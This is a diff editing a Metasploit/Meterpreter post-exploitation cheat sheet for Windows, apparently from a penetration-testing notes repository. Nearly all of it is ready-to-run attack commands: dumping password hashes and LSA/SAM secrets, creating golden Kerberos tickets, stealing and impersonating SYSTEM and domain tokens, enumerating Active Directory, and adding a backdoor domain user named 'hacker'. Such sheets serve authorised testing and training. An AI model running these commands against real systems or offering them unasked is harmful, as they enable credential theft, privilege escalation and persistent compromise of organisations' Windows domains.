@@ -231,13 +231,12 @@ use exploit/windows/local/                        There are currently 77 options
 
 # Dump hashes
 
-hashdump                                          Try to dump password hashes, if this fails continue
 ps                                                Show running processes
 migrate <PID>                                     Migrate to a process running as NT AUTHORITY\SYSTEM
 hashdump                                          Dump password hashes
 
 run post/windows/gather/credentials/credential_collector
-run post/windows/gather/credentials/domain_hashdump
+run post/windows/gather/credentials/domain_hashdump        This only works on a DC
 run post/windows/gather/credentials/gpp
 ------------------------------------------------------------------------------------------------------
 
@@ -255,20 +254,21 @@ golden_ticket_create                              Create a golden kerberos ticke
 kerberos_ticket_list                              List all kerberos tickets
 kerberos_ticket_purge                             Purge any in-use kerberos tickets
 kerberos_ticket_use                               Use a kerberos ticket
-lsa_dump                                          Dump LSA secrets
-wifi_list                                         List wifi profiles/creds
+lsa_dump_sam                                      Dump LSA SAM
+lsa_dump_secrets                                  Dump LSA secrets
 ------------------------------------------------------------------------------------------------------
 
 # Steal tokens
 
-getuid
 use incognito
 list_tokens -u                                    List of tokens that are available
+
 impersonate_token <domain>\\<user>                Impersonate a domain account
-impersonate_token "NT AUTHORITY\SYSTEM"           Impersonate a local account
 getuid
 rev2self                                          Revert back to the original token
 getuid
+
+impersonate_token "NT AUTHORITY\SYSTEM"           Impersonate a local account
 
 ps                                                Show running processes
 steal_token <PID>
@@ -412,40 +412,32 @@ exploit
 
 # Post exploitation of a domain controller (DC)
 
-- Find all Active Directory users
-use post/windows/gather/enum_ad_computers
-set filter objectCategory=computer
-set session 1
-exploit
 
-- Enumerate all logged on users
-use post/windows/gather/enum_logged_on_users
-set session 1
-exploit
+run windows/gather/enum_ad_computers              Find all Active Directory users
+run windows/gather/enum_logged_on_users           Enumerate all logged on users
+run windows/gather/enum_ad_groups                 Gather all Groups in Active Directory
+run windows/gather/enum_shares                    Find all shared folders in Active Directory
 
-- Gather all Groups in Active Directory
-use post/windows/gather/enum_ad_groups
-set session 1
-exploit
-
-- Find all shared folders in Active Directory
-use post/windows/gather/enum_shares
-set session 1
-exploit
 
 - Add any user in Active Directory
-use post/windows/manage/add_user_domain
+run windows/manage/add_user_domain
 set addtodomain true
 set username hacker
 set password w00t!
 set session 1
 exploit
 
-- Delete any  user in Active Directory
-use post/windows/manage/delete_user
+- Delete any user in Active Directory
+run windows/manage/delete_user
 set username hacker
 set session 1
 exploit
+
+run windows/gather/enum_ad_computers              Windows Gather Active Directory Computers
+run windows/gather/enum_ad_groups                 Windows Gather Active Directory Groups
+run windows/gather/enum_ad_users                  Windows Gather Active Directory Users
+run windows/gather/enum_domain                    Windows Gather Enumerate Domain
+run windows/gather/enum_domains                   Windows Gather Domain Enumeration
 ------------------------------------------------------------------------------------------------------
 
 # Misc
